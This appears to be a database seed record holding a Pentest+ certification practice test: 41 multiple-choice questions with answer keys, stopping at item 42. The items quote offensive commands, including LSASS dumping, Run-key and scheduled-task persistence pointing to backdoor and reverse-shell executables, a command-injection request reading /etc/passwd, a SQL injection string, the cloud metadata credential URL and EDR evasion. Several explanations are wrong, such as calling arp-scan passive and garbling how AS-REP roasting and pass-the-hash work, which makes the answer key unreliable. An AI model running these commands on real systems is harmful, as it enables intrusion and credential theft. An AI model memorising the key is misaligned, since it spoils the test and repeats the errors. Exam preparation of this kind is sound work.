db.tests.insertOne({
  "category": "penplus",
  "testId": 5,
  "testName": "Pentest+ Practice Test #5 (Intermediate)",
  "xpPerCorrect": 10,
  "questions": [
    {
      "id": 1,
      "question": "A penetration tester gains access to a compromised Linux system and discovers the following SUID binary:\n\n```\n-rwsr-xr-x 1 root root 15000 Feb 23 10:15 /usr/bin/customapp\n```\n\nWhich of the following commands would be the BEST next step to check for privilege escalation potential?",
      "options": [
        "`strings /usr/bin/customapp | grep exec`",
        "`cat /etc/passwd | grep customapp`",
        "`ldd /usr/bin/customapp`",
        "`netstat -tulnp | grep customapp`"
      ],
      "correctAnswerIndex": 2,
      "explanation": "`ldd /usr/bin/customapp` checks for dynamically linked libraries, which may reveal exploitable shared object (SO) hijacking opportunities. `strings` helps analyze binary execution flow but does not confirm privilege escalation. `/etc/passwd` lists users but is irrelevant here. `netstat` shows open ports but does not assess SUID escalation risks.",
      "examTip": "Always check SUID binaries with `ldd` to identify potential library hijacking vulnerabilities."
    },
    {
      "id": 2,
      "question": "A penetration tester finds a system running an outdated version of OpenSSH with `UsePAM yes` enabled in `sshd_config`. Which of the following attacks is MOST likely to be effective?",
      "options": [
        "Privilege escalation via Pluggable Authentication Module (PAM) abuse",
        "Pass-the-Hash attack to authenticate as another user",
        "Kerberoasting to extract service account hashes",
        "Man-in-the-Middle (MITM) attack using ARP poisoning"
      ],
      "correctAnswerIndex": 0,
      "explanation": "If `UsePAM yes` is enabled, a vulnerable PAM module could be exploited for privilege escalation. Pass-the-Hash does not apply to SSH authentication. Kerberoasting targets Active Directory Kerberos, not OpenSSH. MITM via ARP poisoning can intercept traffic but does not exploit PAM.",
      "examTip": "Check for vulnerable PAM modules when `UsePAM yes` is set in `sshd_config`."
    },
    {
      "id": 3,
      "question": "A penetration tester intercepts the following Kerberos authentication request:\n\n```\nUser: service_account\nRequest: TGS-REQ\nService: HTTP/webserver.target.com\n```\n\nWhich attack is the tester MOST likely preparing for?",
      "options": [
        "Kerberoasting",
        "AS-REP Roasting",
        "Pass-the-Ticket",
        "Golden Ticket Attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Kerberoasting involves requesting a TGS (Ticket Granting Service) ticket for a service account and cracking the ticket's hash offline. AS-REP Roasting targets accounts without preauthentication. Pass-the-Ticket reuses valid Kerberos tickets. Golden Ticket attacks require domain compromise.",
      "examTip": "Kerberoasting targets weak service account passwords by cracking their Kerberos ticket hashes."
    },
    {
      "id": 4,
      "question": "A penetration tester captures the following Windows registry key modification:\n\n```\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n```\n\nWhat is the MOST likely goal of this action?",
      "options": [
        "Establishing persistence by executing a malicious payload at startup",
        "Disabling Windows Defender to avoid detection",
        "Escalating privileges to SYSTEM level",
        "Modifying NTLM authentication settings"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `Run` registry key is commonly used for persistence by executing payloads on startup. Disabling Defender requires modifying security policies. Privilege escalation requires more than just modifying startup entries. NTLM settings are stored elsewhere in the registry.",
      "examTip": "Check `HKLM\\Run` and `HKCU\\Run` for persistence mechanisms on Windows."
    },
    {
      "id": 5,
      "question": "Which of the following techniques allows an attacker to execute arbitrary commands within a running process without writing to disk?",
      "options": [
        "Reflective DLL injection",
        "Pass-the-Ticket attack",
        "SQL injection",
        "Man-in-the-Middle attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Reflective DLL injection loads a DLL directly into memory, bypassing disk-based detection. Pass-the-Ticket is a Kerberos attack. SQL injection targets databases, not process execution. MITM attacks manipulate network traffic, not process memory.",
      "examTip": "Reflective DLL injection is a stealthy way to execute code in memory while avoiding antivirus detection."
    },
    {
      "id": 6,
      "question": "Which of the following Nmap commands would be BEST for detecting web application vulnerabilities on a target system?",
      "options": [
        "`nmap --script=http-vuln-cve2017-5638 -p 80,443 target.com`",
        "`nmap -O -sV target.com`",
        "`nmap -sC -sV -T4 target.com`",
        "`nmap -Pn -p- target.com`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`--script=http-vuln-cve2017-5638` specifically detects vulnerabilities like Apache Struts RCE. `-O -sV` gathers OS and service info but does not check vulnerabilities. `-sC -sV` runs default scripts but lacks targeted vulnerability checks. `-Pn -p-` scans all ports but does not focus on web vulnerabilities.",
      "examTip": "Use targeted NSE scripts to detect specific web application vulnerabilities efficiently."
    },
    {
      "id": 7,
      "question": "A penetration tester wants to check for insecure HTTP methods on a target web server. Which of the following Nmap scripts would be MOST useful?",
      "options": [
        "`nmap --script=http-methods target.com`",
        "`nmap --script=http-title target.com`",
        "`nmap --script=http-headers target.com`",
        "`nmap --script=ssl-enum-ciphers target.com`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `http-methods` script checks for insecure HTTP methods like `PUT` and `DELETE`. `http-title` retrieves the page title. `http-headers` examines headers but does not check methods. `ssl-enum-ciphers` analyzes SSL/TLS configurations, not HTTP methods.",
      "examTip": "Testing for HTTP methods like `PUT` and `DELETE` can reveal unintended file upload or modification risks."
    },
    {
      "id": 8,
      "question": "Which of the following would be the BEST approach for discovering subdomains of a target organization?",
      "options": [
        "Using `Amass` for passive and active subdomain enumeration",
        "Brute-forcing possible subdomains with `wfuzz`",
        "Using `sqlmap` to extract DNS records",
        "Launching an ARP poisoning attack to intercept DNS queries"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`Amass` is a powerful tool for passive and active subdomain enumeration. `wfuzz` can brute-force subdomains but is not as effective as Amass. `sqlmap` is for SQL injection, not DNS. ARP poisoning affects local traffic but does not enumerate subdomains.",
      "examTip": "Subdomain enumeration helps attackers identify additional attack surfaces within a target domain."
    },
    {
      "id": 9,
      "question": "Examine the following log snippet from a web server:\n```\n192.168.1.100 - - [27/Aug/2024:11:30:00 -0400] \"GET /admin/login.php HTTP/1.1\" 200 1234 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0\"\n192.168.1.100 - - [27/Aug/2024:11:30:05 -0400] \"POST /admin/login.php HTTP/1.1\" 302 567 \"http://example.com/admin/login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0\"\n192.168.1.100 - - [27/Aug/2024:11:30:06 -0400] \"GET /admin/index.php HTTP/1.1\" 200 4321 \"http://example.com/admin/login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0\"\n```\nBased on this log, what likely happened?",
      "options": [
        "The user at 192.168.1.100 was unsuccessful in logging in.",
        "The user at 192.168.1.100 successfully logged in to the admin panel.",
        "The web server experienced a denial-of-service attack.",
        "The user at 192.168.1.100 was performing a SQL injection attack."
      ],
      "correctAnswerIndex": 1,
      "explanation": "The sequence shows a GET request to `/admin/login.php` (likely displaying the login form), followed by a POST request to the same page (submitting credentials). The 302 status code on the POST request indicates a redirect (likely to the admin dashboard after successful login). Finally, a GET request to `/admin/index.php` with a 200 status code (success) suggests the user is now accessing the admin panel. This indicates a successful login. There's no evidence of a DoS or SQLi attack in this snippet.",
      "examTip": "HTTP status codes (200=OK, 302=Redirect) and request methods (GET, POST) are key to interpreting web server logs."
    },
    {
      "id": 10,
      "question": "You are performing a penetration test and discover a web application that allows you to upload files without proper validation. Which of the following file extensions, if successfully uploaded and executed, would pose the GREATEST security risk?",
      "options": [
        ".txt",
        ".jpg",
        ".php",
        ".html"
      ],
      "correctAnswerIndex": 2,
      "explanation": "`.php` files contain server-side PHP code. If the web server is configured to execute PHP files (which is common), uploading a malicious `.php` file allows for Remote Code Execution (RCE) â€“ a very serious vulnerability. `.txt` files are plain text, `.jpg` files are images, and while `.html` files *can* contain client-side scripts (potentially leading to XSS), they don't directly allow server-side code execution.",
      "examTip": "Unrestricted file upload + server-side code execution (e.g., .php) = RCE."
    },
    {
      "id": 11,
      "question": "A penetration tester is conducting a post-exploitation analysis and runs the following command on a Windows system:\n\n```\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\TermService\n```\n\nWhat is the MOST likely objective of this action?",
      "options": [
        "Checking for misconfigured RDP service settings that allow unauthorized access",
        "Enumerating scheduled tasks that could be leveraged for privilege escalation",
        "Searching for stored credentials within registry keys to access sensitive resources",
        "Verifying the presence of Group Policy settings that restrict system modifications"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Querying `TermService` in the registry checks Remote Desktop Protocol (RDP) service configurations, which can reveal misconfigurations allowing unauthorized access. Scheduled tasks are found under `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule`. Credentials are typically stored in `HKLM\\SECURITY`. Group Policy settings are managed under `HKLM\\Software\\Policies`.",
      "examTip": "Checking `TermService` configurations can help identify weak RDP security settings for potential exploitation."
    },
    {
      "id": 12,
      "question": "A penetration tester captures network traffic and observes multiple DNS requests for subdomains under `*.example.com`, each followed by an HTTP request to an external server. What is the MOST likely explanation for this activity?",
      "options": [
        "An attacker is using DNS tunneling to exfiltrate data via encoded queries",
        "A compromised system is performing domain fronting to bypass security controls",
        "A botnet is using fast-flux DNS techniques to evade detection",
        "A phishing campaign is resolving random subdomains to track user activity"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Repeated DNS queries for subdomains followed by HTTP requests suggest DNS tunneling, where data is encoded into DNS queries to bypass security controls. Domain fronting manipulates HTTP headers rather than DNS queries. Fast-flux DNS changes IPs frequently for resilience. Phishing campaigns use domain tracking but do not involve continuous encoded requests.",
      "examTip": "Unusual high-frequency DNS requests with external HTTP traffic often indicate DNS tunneling for data exfiltration."
    },
    {
      "id": 13,
      "question": "A penetration tester gains access to a target machine and finds the following running process:\n\n```\nC:\\Windows\\System32\\lsass.exe\n```\n\nWhich of the following actions would MOST likely lead to credential extraction?",
      "options": [
        "Dumping the process memory using `procdump.exe` and analyzing the output",
        "Modifying the registry to enable WDigest authentication for password recovery",
        "Extracting Kerberos tickets from the user's session using Mimikatz",
        "Capturing NTLM challenge-response authentication using a network sniffer"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Dumping `lsass.exe` allows attackers to extract credentials from memory. Enabling WDigest can expose plaintext passwords but requires a reboot. Extracting Kerberos tickets provides lateral movement options but not stored credentials. NTLM sniffing captures authentication traffic, not stored credentials.",
      "examTip": "Dumping LSASS memory is a common technique for extracting credentials using tools like `procdump` or `Mimikatz`."
    },
    {
      "id": 14,
      "question": "A penetration tester discovers a web server that allows unrestricted file uploads. Which of the following methods would be the MOST effective for achieving remote code execution?",
      "options": [
        "Uploading a web shell script disguised as an image file with an unexpected extension",
        "Exploiting an insecure direct object reference (IDOR) vulnerability to modify file paths",
        "Injecting a payload into a stored XSS attack to execute commands via JavaScript",
        "Performing a directory traversal attack to overwrite critical system files"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Uploading a web shell disguised as an image (`image.php.jpg`) can bypass weak validation and allow remote code execution. IDOR allows unauthorized file access but not code execution. Stored XSS affects user sessions but does not execute system commands. Directory traversal exploits path issues but does not run arbitrary code.",
      "examTip": "If file upload restrictions are weak, attempt bypass techniques like double extensions (`.php.jpg`) or content-type spoofing."
    },
    {
      "id": 15,
      "question": "A penetration tester runs the following command on a Linux system:\n\n```\nfind / -type f -perm -4000 2>/dev/null\n```\n\nWhat is the tester attempting to identify?",
      "options": [
        "SUID binaries that could be exploited for privilege escalation",
        "Hidden files that contain sensitive system credentials",
        "Misconfigured directories that allow unauthorized file execution",
        "Log files that store plaintext passwords for authentication"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command searches for SUID binaries, which execute with elevated privileges and may be exploited for privilege escalation. Hidden files are found with `ls -la`. Misconfigured directories require different permission checks. Log files containing plaintext passwords are not related to SUID binaries.",
      "examTip": "Privilege escalation via SUID binaries is a common technique; always check for misconfigured permissions."
    },
    {
      "id": 16,
      "question": "Which of the following payload techniques is MOST effective at bypassing endpoint detection and response (EDR) solutions?",
      "options": [
        "Executing shellcode via direct syscalls to avoid user-mode hooks",
        "Encoding the payload in Base64 to evade string-based detection",
        "Embedding malicious macros in a Microsoft Word document",
        "Using a polymorphic payload that modifies its structure upon execution"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Direct syscalls bypass user-mode hooks used by EDR, making detection more difficult. Base64 encoding can be trivially decoded. Macros are commonly blocked by security policies. Polymorphic malware changes structure but is still detectable based on behavior.",
      "examTip": "Direct syscall execution is a common technique for bypassing modern EDR solutions."
    },
    {
      "id": 17,
      "question": "A penetration tester wants to enumerate all live hosts on a subnet while avoiding detection by security systems. Which of the following commands would be the MOST effective?",
      "options": [
        "`arp-scan --localnet`",
        "`nmap -sS -T5 192.168.1.0/24`",
        "`ping -b 192.168.1.255`",
        "`netcat -zv 192.168.1.1-254 80`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`arp-scan` enumerates hosts passively by detecting ARP responses, minimizing detection. `nmap -sS -T5` is aggressive and easily detected. `ping -b` is ineffective on many networks. `netcat -zv` scans specific ports but does not enumerate all live hosts.",
      "examTip": "Using `arp-scan` is a stealthier way to detect active hosts without triggering IDS alerts."
    },
    {
      "id": 18,
      "question": "A penetration tester intercepts a network packet with the following command:\n\n```\ntcpdump -i eth0 port 21\n```\n\nWhat type of traffic is the tester capturing?",
      "options": [
        "FTP traffic, which may expose plaintext credentials",
        "SSH traffic, which is encrypted and not readable",
        "RDP traffic, which can reveal session tokens",
        "DNS traffic, which could indicate domain enumeration"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Port 21 is used for FTP, which transmits credentials in plaintext. SSH (port 22) is encrypted. RDP (port 3389) uses graphical sessions. DNS (port 53) involves name resolution, not file transfers.",
      "examTip": "FTP transmits credentials in plaintextâ€”use packet sniffing tools like `tcpdump` or `Wireshark` to capture them."
    },
    {
      "id": 19,
      "question": "A penetration tester is analyzing a compromised Windows system and finds the following scheduled task:\n\n```\nSCHTASKS /Create /SC ONSTART /TN \"UpdateChecker\" /TR \"C:\\Users\\Public\\backdoor.exe\" /RU SYSTEM\n```\n\nWhat is the PRIMARY objective of this scheduled task?",
      "options": [
        "Maintaining persistence by executing a payload at system startup",
        "Disabling security updates to prevent detection",
        "Escalating privileges from a local user to SYSTEM",
        "Hijacking an existing process to execute arbitrary commands"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The scheduled task runs `backdoor.exe` at startup under the SYSTEM account, ensuring persistence. It does not disable security updates, directly escalate privileges, or hijack another process.",
      "examTip": "Check `SCHTASKS /Query /FO LIST /V` for scheduled tasks that attackers use for persistence."
    },
        {
      "id": 20,
      "question": "Which of the following techniques would MOST effectively evade detection when executing a malicious payload on a Windows system?",
      "options": [
        "Executing shellcode via direct syscalls to bypass user-mode hooks",
        "Encoding the payload in Base64 before execution",
        "Embedding malicious macros in a Microsoft Office document",
        "Running the payload from a USB drive instead of the system disk"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Direct syscalls bypass user-mode API hooks used by endpoint detection and response (EDR) solutions, making detection difficult. Base64 encoding is easily reversed. Macros can be blocked by security policies. Running from a USB does not evade detection.",
      "examTip": "Direct syscall execution is an advanced technique for bypassing modern EDR solutions."
    },
    {
      "id": 21,
      "question": "A penetration tester is analyzing a captured NTLMv2 hash and wants to determine if it can be relayed. Which of the following conditions MUST be met for a successful NTLM relay attack?",
      "options": [
        "The target system must have SMB signing disabled",
        "The attacker must already possess valid domain credentials",
        "The NTLM hash must be stored in the local SAM database",
        "The Kerberos TGT must be valid for the relayed session"
      ],
      "correctAnswerIndex": 0,
      "explanation": "For an NTLM relay attack to succeed, SMB signing must be disabled. Having domain credentials does not impact relaying. Local SAM hashes are not relevant to NTLM relay. Kerberos TGTs are used in Kerberos authentication, not NTLM relay.",
      "examTip": "Check if SMB signing is disabled before attempting an NTLM relay attack, as it prevents authentication relays."
    },
    {
      "id": 22,
      "question": "A penetration tester is analyzing a Windows system and finds a service running with SYSTEM privileges but has a writable binary path. What is the BEST way to escalate privileges?",
      "options": [
        "Replacing the service executable with a malicious payload",
        "Injecting a Meterpreter shellcode into the running process",
        "Performing an NTLM relay attack to authenticate as SYSTEM",
        "Brute-forcing the local administrator password to gain access"
      ],
      "correctAnswerIndex": 0,
      "explanation": "If a service runs as SYSTEM and its binary path is writable, replacing it with a malicious payload can lead to privilege escalation. Process injection does not modify the service. NTLM relay affects network authentication, not local services. Brute-forcing local passwords is noisy and unreliable.",
      "examTip": "Always check service permissionsâ€”if a non-admin user can modify a SYSTEM service, privilege escalation is possible."
    },
    {
      "id": 23,
      "question": "A penetration tester scans a target web application and finds the following response:\n\n```\nHTTP/1.1 200 OK\nSet-Cookie: sessionid=abcd1234; HttpOnly; Secure;\n```\n\nWhich of the following attacks would still be possible despite these cookie settings?",
      "options": [
        "Session hijacking via network interception",
        "Cross-Site Request Forgery (CSRF)",
        "JavaScript-based session theft using XSS",
        "Session fixation with a predictable token"
      ],
      "correctAnswerIndex": 1,
      "explanation": "While `HttpOnly` prevents JavaScript from accessing cookies and `Secure` ensures they are transmitted over HTTPS, CSRF attacks remain possible if the server does not implement proper CSRF protection. Session hijacking via interception is mitigated by HTTPS. XSS cannot steal the cookie due to `HttpOnly`. Session fixation depends on token handling policies.",
      "examTip": "Even with secure cookie settings, CSRF is still a risk if anti-CSRF mechanisms are not implemented."
    },
    {
      "id": 24,
      "question": "Which of the following methods would BEST allow a penetration tester to enumerate valid user accounts on an Active Directory domain without triggering account lockouts?",
      "options": [
        "Performing a Kerberos enumeration attack using `GetNPUsers.py`",
        "Using a brute-force attack against the domain controller",
        "Executing an NTLM relay attack on SMB authentication requests",
        "Extracting stored credentials from the SAM database"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`GetNPUsers.py` can enumerate Kerberos accounts without triggering lockouts by requesting non-preauthenticated service tickets. Brute-force attacks risk locking accounts. NTLM relay exploits authentication but does not enumerate users. SAM credential extraction requires local admin access.",
      "examTip": "Kerberos-based enumeration can reveal valid domain accounts without triggering security alerts."
    },
    {
      "id": 25,
      "question": "A penetration tester successfully gains access to an AWS EC2 instance via a misconfigured SSH key. Which action would provide the MOST valuable escalation path?",
      "options": [
        "Querying the AWS metadata service for IAM role credentials",
        "Enumerating running processes to locate plaintext passwords",
        "Capturing network traffic for unencrypted authentication data",
        "Scanning for world-writable files to plant a backdoor"
      ],
      "correctAnswerIndex": 0,
      "explanation": "AWS EC2 metadata services often contain IAM role credentials, allowing attackers to escalate privileges. Process enumeration and network traffic analysis are useful but may not yield credentials. Writable file scanning is a persistence technique rather than an escalation method.",
      "examTip": "AWS metadata services often expose credentialsâ€”always check `http://169.254.169.254/latest/meta-data/`."
    },
    {
      "id": 26,
      "question": "Which of the following conditions must be met for a successful Kerberoasting attack?",
      "options": [
        "The target service account must have a weak password",
        "The attacker must have administrator privileges on the domain",
        "The domain controller must have SMB signing disabled",
        "The target account must have unconstrained delegation enabled"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Kerberoasting requires a weak service account password since attackers extract and attempt to crack service tickets offline. Admin privileges are not required. SMB signing is unrelated. Unconstrained delegation is an attack vector but not necessary for Kerberoasting.",
      "examTip": "Weak service account passwords make Kerberoasting effectiveâ€”always check for easy-to-crack hashes."
    },
    {
      "id": 27,
      "question": "A penetration tester finds a Jenkins server with unauthenticated access to its web interface. What is the BEST next step to escalate privileges?",
      "options": [
        "Execute system commands using a Groovy script console",
        "Modify the Jenkins configuration files to add a new admin user",
        "Leverage an SSRF vulnerability to access internal resources",
        "Upload a web shell to the Jenkins build directory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The Jenkins Groovy script console allows direct execution of system commands if access is unauthenticated. Modifying config files requires file system access. SSRF can access resources but does not escalate privileges. Uploading a web shell depends on build configurations.",
      "examTip": "If Jenkins allows unauthenticated access to the Groovy script console, it can be used for command execution."
    },
    {
      "id": 28,
      "question": "A penetration tester runs the following command on a Linux system:\n\n```\nsudo -l\n```\n\nWhat is the MOST likely objective of this action?",
      "options": [
        "Checking for misconfigurations that allow privilege escalation",
        "Enumerating writable directories for persistence",
        "Identifying processes running as root",
        "Searching for stored SSH keys on the system"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `sudo -l` command lists sudo privileges for the current user, identifying potential privilege escalation paths. Writable directories can be found using `find`. Root processes are checked with `ps`. SSH keys are stored in `~/.ssh` but are unrelated to `sudo -l`.",
      "examTip": "Always run `sudo -l` when assessing privilege escalation paths on Linux."
    },
    {
      "id": 29,
      "question": "A penetration tester captures an NTLMv2 hash over SMB using Responder. What is the BEST next step?",
      "options": [
        "Relay the hash to authenticate against another system",
        "Crack the hash offline using dictionary-based attacks",
        "Inject the hash into a new session for lateral movement",
        "Modify the NTLM hash to bypass authentication restrictions"
      ],
      "correctAnswerIndex": 0,
      "explanation": "If SMB signing is disabled, NTLM hashes can be relayed to authenticate without cracking. Cracking NTLMv2 is difficult and time-consuming. Pass-the-Hash works for NTLMv1 but not NTLMv2. Modifying NTLM hashes does not bypass authentication.",
      "examTip": "NTLMv2 hashes are difficult to crackâ€”relay attacks are often more effective if SMB signing is disabled."
    },
    {
      "id": 30,
      "question": "Which of the following techniques is MOST effective for extracting plaintext credentials from memory on a Windows system?",
      "options": [
        "Dumping LSASS memory with `procdump.exe` and analyzing it with Mimikatz",
        "Using Responder to capture NetNTLM authentication attempts",
        "Intercepting SMB traffic to retrieve NTLMv2 hashes",
        "Extracting cached credentials from the SAM database"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Dumping LSASS memory with `procdump.exe` and analyzing it with Mimikatz can reveal plaintext credentials. Responder captures hashes but not plaintext passwords. SMB interception retrieves NTLM hashes, not plaintext credentials. The SAM database does not store plaintext passwords.",
      "examTip": "LSASS memory dumping is a common method for extracting plaintext credentials on Windows."
    },
    {
      "id": 31,
      "question": "A penetration tester executes the following command on a compromised Linux system:\n\n```\nfind / -writable -type d 2>/dev/null\n```\n\nWhat is the tester MOST likely trying to accomplish?",
      "options": [
        "Identifying directories where a persistent backdoor can be placed",
        "Searching for world-readable files that contain sensitive information",
        "Enumerating directories that contain misconfigured SUID binaries",
        "Finding system logs that store authentication credentials"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command searches for writable directories, which can be used to place a backdoor or modify system files for persistence. World-readable files are found with `-perm -o+r`. SUID binaries require `-perm -4000`. Log files are typically stored under `/var/log/`.",
      "examTip": "Writable directories can be abused for persistence or privilege escalationâ€”always check their permissions."
    },
    {
      "id": 32,
      "question": "A penetration tester intercepts the following HTTP request:\n\n```\nPOST /auth/login HTTP/1.1\nHost: app.target.com\nContent-Type: application/json\n\n{\"username\":\"admin\",\"password\":\"password123\"}\n```\n\nWhich of the following attack techniques would be MOST effective given this request format?",
      "options": [
        "Modifying the request to test for SQL injection vulnerabilities",
        "Using an NTLM relay attack to capture authentication credentials",
        "Attempting a brute-force attack against the login endpoint",
        "Exploiting an SSRF vulnerability to access internal services"
      ],
      "correctAnswerIndex": 0,
      "explanation": "SQL injection can be tested by modifying the request payload to include `' OR '1'='1`. NTLM relay attacks target Windows authentication, not JSON-based logins. Brute-force attacks are inefficient if rate-limiting is implemented. SSRF targets back-end services, not login forms.",
      "examTip": "Always test login forms for SQL injection by modifying request parameters and observing responses."
    },
    {
      "id": 33,
      "question": "Which of the following techniques would allow a penetration tester to bypass SMB signing and execute a relay attack?",
      "options": [
        "Exploiting a system with SMBv1 enabled and signing disabled",
        "Performing a Kerberos downgrade attack to capture credentials",
        "Using a brute-force attack to obtain NTLM hashes for relay",
        "Exploiting a misconfigured Group Policy Object (GPO) to disable signing"
      ],
      "correctAnswerIndex": 0,
      "explanation": "SMB signing prevents relay attacks, but if SMBv1 is enabled and signing is disabled, attackers can relay NTLM authentication. Kerberos downgrade does not impact NTLM relay. Brute-force attacks are separate from relaying. GPO misconfigurations may disable signing but are not the primary method for bypassing it.",
      "examTip": "Check if SMB signing is disabled before attempting an NTLM relay attack using tools like `ntlmrelayx`."
    },
    {
      "id": 34,
      "question": "A penetration tester finds that an organizationâ€™s AWS S3 bucket is publicly accessible and allows `s3:PutObject`. What is the MOST significant risk associated with this?",
      "options": [
        "Attackers can upload malicious files or overwrite existing data",
        "Unauthorized users can download sensitive files from the bucket",
        "The bucket can be taken over by registering a conflicting IAM policy",
        "The misconfiguration allows privilege escalation within AWS IAM roles"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `s3:PutObject` permission allows attackers to upload or overwrite objects, potentially leading to malware distribution. Public read access (`s3:GetObject`) allows file downloads. IAM conflicts do not impact direct S3 bucket access. Privilege escalation requires IAM misconfigurations beyond this setting.",
      "examTip": "Always verify `s3:PutObject` permissionsâ€”malicious uploads can lead to data compromise and security breaches."
    },
    {
      "id": 35,
      "question": "A penetration tester attempts to escalate privileges on a compromised Windows system and executes:\n\n```\nwhoami /priv\n```\n\nWhich of the following conditions would MOST likely allow privilege escalation?",
      "options": [
        "SeAssignPrimaryTokenPrivilege is enabled",
        "SeTimeZonePrivilege is enabled",
        "SeShutdownPrivilege is enabled",
        "SeLockMemoryPrivilege is enabled"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`SeAssignPrimaryTokenPrivilege` allows impersonating other users, making it useful for privilege escalation. `SeTimeZonePrivilege`, `SeShutdownPrivilege`, and `SeLockMemoryPrivilege` do not provide direct privilege escalation opportunities.",
      "examTip": "Check privilege tokens with `whoami /priv`â€”certain privileges like `SeAssignPrimaryTokenPrivilege` can lead to escalation."
    },
    {
      "id": 36,
      "question": "A penetration tester is analyzing an Active Directory environment and finds a service account with `unconstrained delegation` enabled. What is the PRIMARY risk?",
      "options": [
        "An attacker can impersonate high-privilege users and access resources",
        "The account can be brute-forced to gain administrator privileges",
        "Kerberos authentication tickets can be replayed indefinitely",
        "The domain controller can be remotely exploited using SMB signing bypass"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Unconstrained delegation allows attackers to impersonate privileged users once they compromise the service account. Brute-forcing the account is not directly related to delegation. Kerberos tickets expire, so they cannot be replayed indefinitely. SMB signing is unrelated to delegation.",
      "examTip": "Disable unconstrained delegation to prevent attackers from escalating privileges in Active Directory."
    },
    {
      "id": 37,
      "question": "A penetration tester intercepts a command injection attempt that was successfully executed:\n\n```\nGET /search?query=%3Bcat%20/etc/passwd\n```\n\nWhich security control should be implemented to prevent this vulnerability?",
      "options": [
        "Sanitizing user input to block special characters",
        "Enforcing HTTPS to encrypt transmitted data",
        "Enabling a Web Application Firewall (WAF) to monitor requests",
        "Using Content Security Policy (CSP) to restrict JavaScript execution"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Input sanitization is necessary to prevent command injection attacks. HTTPS encrypts data but does not prevent injection. A WAF may help but should not be relied upon as the primary defense. CSP restricts JavaScript execution, not server-side command execution.",
      "examTip": "Always sanitize and validate user input to prevent command injection vulnerabilities."
    },
    {
      "id": 38,
      "question": "A penetration tester captures network traffic and finds that a target server supports the following cipher suite:\n\n```\nTLS_RSA_WITH_RC4_128_SHA\n```\n\nWhat is the MOST significant risk associated with this configuration?",
      "options": [
        "The RC4 cipher is vulnerable to known cryptographic attacks",
        "The RSA algorithm allows attackers to perform hash collisions",
        "The SHA hashing algorithm is susceptible to length extension attacks",
        "The TLS protocol can be downgraded to allow plaintext communication"
      ],
      "correctAnswerIndex": 0,
      "explanation": "RC4 is deprecated due to significant security vulnerabilities. RSA hash collisions are not a major risk in this context. SHA length extension attacks do not apply here. TLS downgrade attacks require additional conditions beyond weak cipher selection.",
      "examTip": "RC4 is weak and should be disabled in favor of modern ciphers like AES-GCM."
    },
    {
      "id": 39,
      "question": "A penetration tester uses the following command on a Linux system:\n\n```\nsudoedit /etc/shadow\n```\n\nWhat is the MOST likely objective of this action?",
      "options": [
        "Attempting privilege escalation by modifying user password hashes",
        "Enumerating running processes to identify misconfigured services",
        "Extracting plaintext credentials stored in system logs",
        "Injecting a payload into a system startup script for persistence"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`sudoedit /etc/shadow` attempts to modify password hashes for privilege escalation. Running processes are enumerated with `ps`. Logs do not contain password hashes. Startup scripts are found in `/etc/init.d`.",
      "examTip": "If `sudoedit` allows modifying `/etc/shadow`, attackers can reset passwords and gain root access."
    },
    {
      "id": 40,
      "question": "A penetration tester executes the following PowerShell command on a Windows system:\n\n```\nStart-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File C:\\Users\\Public\\script.ps1'\n```\n\nWhat is the PRIMARY goal of this command?",
      "options": [
        "Executing a PowerShell script while bypassing execution restrictions",
        "Extracting credentials stored in Windows Credential Manager",
        "Modifying system firewall rules to allow incoming connections",
        "Enumerating running processes for potential privilege escalation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command runs a PowerShell script with execution policy bypassed, allowing malicious scripts to run. Credential extraction requires separate commands. Firewall modifications require `netsh`. Process enumeration is done using `Get-Process` or `tasklist`.",
      "examTip": "Attackers often use `-ExecutionPolicy Bypass` to run PowerShell scripts undetected."
    },      
    {
      "id": 41,
      "question": "A penetration tester successfully executes the following command on a compromised Windows system:\n\n```\nreg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe /c reverse_shell.exe\"\n```\n\nWhat is the PRIMARY objective of this action?",
      "options": [
        "Maintaining persistence by executing a payload at system startup",
        "Escalating privileges to SYSTEM by modifying registry permissions",
        "Disabling Windows Defender to prevent malware detection",
        "Hijacking legitimate processes to execute arbitrary commands"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Adding an entry to `HKLM\\Run` ensures the payload executes at startup, maintaining persistence. Modifying registry keys does not directly escalate privileges. Disabling Windows Defender requires different registry changes. Process hijacking typically involves DLL injection.",
      "examTip": "Adding registry keys under `HKLM\\Run` is a common persistence technique on Windows systems."
    },
    {
      "id": 42,
